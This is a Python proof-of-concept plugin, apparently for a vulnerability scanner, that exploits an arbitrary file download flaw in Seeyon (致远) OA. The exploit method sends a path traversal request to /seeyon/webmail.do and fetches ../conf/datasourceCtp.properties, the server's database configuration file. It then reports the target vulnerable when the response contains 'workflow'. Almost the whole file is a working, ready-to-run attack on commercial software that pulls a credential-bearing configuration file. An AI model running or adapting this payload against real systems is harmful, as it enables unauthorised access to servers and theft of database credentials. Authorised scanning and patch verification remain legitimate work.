import pocs
from lib import config
import re
import requests
from bs4 import BeautifulSoup
import urllib3
from colorama import init
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
init(autoreset=False) 

# 定义类 名称不可改变，且需要继承父类Pocs
class POC(pocs.Pocs):

    def __init__(self):
        '''
            初始化函数
        '''
        # 根据漏洞的信息进行定义
        super().__init__()
        self.poc_name='致远oa_任意文件下载漏洞'
        self.vul_name='致远oa_任意文件下载漏洞'
        self.vul_num=''
        self.app_name='致远oa'
        self.app_version=''
        self.author='haochen'
        self.msg='webmail.do任意文件下载'
        # 根据需要的参数进行定义，被攻击的url或ip必须定义为target
        self.must_parameter={
            'target' : ''
        }

    def exploit(self,must_parameter,cho_parameter):
        '''
            扫描使用的函数
        '''
        # 自由发挥
        att_msg={}
        # 将攻击的目标和poc名称导入
        url = must_parameter['target']
        att_msg['target']=url
        att_msg['pocname'] = self.poc_name
        self.must_parameter = must_parameter
        head = config.Pack
        self.payload='/seeyon/webmail.do?method=doDownloadAtt&filename=PeiQi.txt&filePath=../conf/datasourceCtp.properties'
        if re.search('/$',url):
            url=url[0:len(url)-1]
        target = url + self.payload
        try:
            response = requests.get(target,headers=head)
            # 攻击完成后需要将攻击的结果写入
            if 'workflow' in response.text and response.status_code==200:
                att_msg['status'] = 'success'
                att_msg['msg'] = '存在webmail.do任意文件下载漏洞,payload为:'+self.payload
            else:
                att_msg['status']='failed'
                att_msg['msg']='不存在漏洞，网站返回值为: '+str(response.status_code) 
                #self.set_cout('failed','不存在漏洞，网站返回值为: '+str(response.status_code) )
        except:
            att_msg['status']='error'
            att_msg['msg']='无法正确访问网站'
            #self.set_cout('error','无法正确访问网站！')
        # 返回攻击结果信息
        return att_msg